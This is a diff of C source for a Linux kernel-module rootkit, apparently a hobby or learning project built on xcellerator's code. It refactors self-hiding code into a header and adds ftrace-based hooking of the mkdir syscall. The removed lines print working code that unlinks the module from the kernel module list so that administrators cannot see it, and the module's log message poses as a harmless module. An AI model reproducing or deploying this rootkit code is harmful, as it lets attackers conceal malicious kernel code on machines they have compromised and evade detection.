@@ -1,53 +1,52 @@
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
+/*
+ * credits goes to xcellerator, which provided the base code for this rootkit
+ */
 
-#define HIDE_MODULE 1
-#define SYSCALL_HOOK 1
+#define HIDE_MODULE
+#define SYSCALL_HOOK
 #define SYSCALL_HOOK_TO "mkdir"
+
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/version.h>
+
+#ifdef SYSCALL_HOOK
+
+#include <linux/ftrace.h>
+#include <linux/linkage.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
+#include <linux/version.h>
+
+#if defined(CONFIG_X86_64)
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+#include "ftrace_helper.h"
+
+#endif
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Began Bajrami");
 MODULE_DESCRIPTION("IRM-C");
 MODULE_VERSION("0.01");
 
-/*
- * credits goes to: xcellerator
- */
-
-#if HIDE_MODULE == 1
-/* list_head is a doubly-linked list structure used by the kernel
- * It's got a .prev and .next field, but we can use the list_del()
- * and list_add() functions add/remove items from a list_head struct.
- * The only thing to keep in mind is that we need to keep a local copy
- * of the item that we remove so we can add it back later when we're done.
- */
-static struct list_head *prev_module;
-static short hidden = 0;
-
-void showme(void) {
-  /* Add the saved list_head struct back to the module list */
-  list_add(&THIS_MODULE->list, prev_module);
-  hidden = 0;
-}
-
-void hideme(void) {
-  /* Save the module in the list before us, so we can add ourselves
-   * back to the list in the same place later. */
-  prev_module = THIS_MODULE->list.prev;
-  /* Remove ourselves from the list module list */
-  list_del(&THIS_MODULE->list);
-  hidden = 1;
-}
-
+#ifdef HIDE_MODULE
+#include "features/hide.h"
 #endif
 
 static int __init rootkit_init(void) {
   printk(KERN_INFO "hey! i'm just a chill module.\n");
-#if HIDE_MODULE == 1
+
+#ifdef HIDE_MODULE
   printk(KERN_INFO "let me hide myself...\n");
   hideme();
 #endif
+
   return 0;
 }
 
